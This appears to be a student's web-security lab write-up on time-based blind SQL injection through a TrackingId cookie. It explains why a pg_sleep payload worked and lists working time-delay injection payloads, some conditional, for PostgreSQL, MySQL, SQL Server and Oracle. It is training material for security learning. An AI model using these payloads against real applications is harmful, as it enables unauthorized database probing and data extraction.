
## Lab 8 — Blind SQL Injection with Time Delays

### Goal

Exploit a blind SQL injection vulnerability to cause a 10-second delay in
the application's response.

### What I Observed

The application:

- Did not return the SQL query results.
- Did not respond differently when the query returned rows.
- Did not respond differently when the query caused an error.
- Executed the SQL query synchronously.

Because the response waited for the SQL query to finish, I could use a
database time delay as an observable signal.

### Successful Payload

```text
TrackingId=x'||pg_sleep(10)--
````

After sending the request, the application took approximately 10 seconds
to respond.

### Why It Worked

`pg_sleep(10)` is a PostgreSQL function that pauses the database session
for 10 seconds.

The payload:

```text
x'||pg_sleep(10)--
```

injects the PostgreSQL sleep function into the SQL query.

The `--` comments out the remaining part of the original query.

The application waits for the database query to finish before returning the
response, so the intentional delay becomes observable.

### What I Learned

* Blind SQL injection can use response time as an information channel.
* A database-specific sleep function can introduce a measurable delay.
* Time-based SQL injection is useful when the application provides no useful
  response differences or error messages.
* The exact time-delay syntax depends on the database management system.
* Burp Repeater can be used to measure and compare response times.
* Time-based SQL injection can also be combined with conditional logic to
  infer information one bit/condition at a time.

## Time-Delay Payloads by Database

The syntax depends on the database being targeted.

### PostgreSQL

```sql
'||pg_sleep(10)--
```

Example:

```text
TrackingId=x'||pg_sleep(10)--
```

### MySQL

```sql
' AND SLEEP(10)--
```

Example:

```text
TrackingId=x' AND SLEEP(10)--
```

MySQL can also use:

```sql
' AND IF(1=1,SLEEP(10),0)--
```

This is useful when the delay needs to happen only when a condition is true.

### Microsoft SQL Server

```sql
'; WAITFOR DELAY '0:0:10'--
```

Example:

```text
TrackingId=x'; WAITFOR DELAY '0:0:10'--
```

For conditional delays:

```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

### Oracle

Oracle does not have a simple `SLEEP()` function like PostgreSQL or MySQL.

A commonly used approach is:

```sql
' AND DBMS_PIPE.RECEIVE_MESSAGE('x',10)=0--
```

Example:

```text
TrackingId=x' AND DBMS_PIPE.RECEIVE_MESSAGE('x',10)=0--
```
